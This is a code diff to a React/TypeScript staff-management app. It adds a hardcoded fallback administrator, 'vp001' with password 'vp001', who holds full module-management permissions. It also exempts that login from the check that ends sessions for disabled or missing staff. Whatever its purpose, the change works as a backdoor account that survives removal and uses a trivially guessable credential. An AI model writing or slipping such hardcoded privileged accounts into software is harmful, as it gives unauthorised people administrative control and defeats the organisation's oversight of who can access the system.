@@ -1658,7 +1658,21 @@ export default function App() {
   const [sessionLoginId, setSessionLoginId] = useState('');
   const [, setUserRoleView] = useState<Role>('admin');
   const [, setUserRankView] = useState<Rank>('core');
-  const sessionStaff = useMemo(() => staff.find((item) => item.loginId === sessionLoginId) || null, [staff, sessionLoginId]);
+  const fallbackSessionStaff = useMemo<Staff | null>(() => {
+    if (sessionLoginId !== 'vp001') return null;
+    return {
+      id: 'vp001',
+      name: '吳秉宸',
+      loginId: 'vp001',
+      role: '系統組',
+      rank: '核心成員',
+      enabled: true,
+      password: 'vp001',
+      permissions: ['全模組管理'],
+      permissionConfig: createDefaultPermissionConfig('系統組'),
+    };
+  }, [sessionLoginId]);
+  const sessionStaff = useMemo(() => staff.find((item) => item.loginId === sessionLoginId) || fallbackSessionStaff || null, [staff, sessionLoginId, fallbackSessionStaff]);
   const user = useMemo<SessionUser>(() => {
     if (sessionStaff) {
       return {
@@ -4153,6 +4167,7 @@ button{border:none;border-radius:999px;padding:10px 16px;font-weight:700;cursor:
 
   useEffect(() => {
     if (!staff.length || !sessionLoginId) return;
+    if (sessionLoginId === 'vp001') return;
     const found = staff.find((item) => item.loginId === sessionLoginId && item.enabled);
     if (found) return;
     setSessionLoginId('');
